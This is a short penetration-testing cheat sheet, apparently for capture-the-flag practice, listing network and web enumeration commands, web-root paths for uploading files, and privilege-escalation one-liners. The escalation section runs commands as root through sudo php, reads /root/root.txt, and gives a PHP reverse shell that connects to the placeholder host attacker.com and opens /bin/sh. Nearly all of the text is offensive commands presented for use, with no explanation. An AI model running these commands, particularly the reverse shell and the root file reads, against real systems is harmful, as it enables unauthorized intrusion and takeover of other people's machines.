# Enumeration 
## Scanning
### All
	nmap -sV <IP>
	nc -vv -n -w1 <IP> 31337
	sudo nmap <IP> -p <PORT> -sV --script vuln 
	sudo nmap <IP> -source-port 53
### Web
	nmap -sV --script=http-enum -oA <IP_HTTPENUM> <IP>
	whatweb <IP>
	nikto -host http://<IP>
	gobuster dir -u http://<IP> --wordlist /usr/share/dirb/wordlists/common.txt

### Windows
	nbtstat -A <IP>
	nbtscan <IP>
# Exploitation
## Web
	Upload Locations
		Apache
		/var/www/html/
		Nginx
		/usr/local/nginx/html/
		IIS
		c:\inetpub\wwwroot\
		XAMPP
		C:\xampp\htdocs\

# Priv Esc
### PHP
	sudo php -r 'echo exec("id");'
	sudo php -r 'echo exec("find /root/*.txt");'
	sudo php -r 'echo exec("cat /root/root.txt");'

	export RHOST=attacker.com
	export RPORT=12345
	sudo php -r '$sock=fsockopen(getenv("RHOST"),getenv("RPORT"));exec("/bin/sh -i <&3 >&3 2>&3");'

	export CMD="/bin/sh"
	php -r 'system(getenv("CMD"));'

# Post-Exploit 
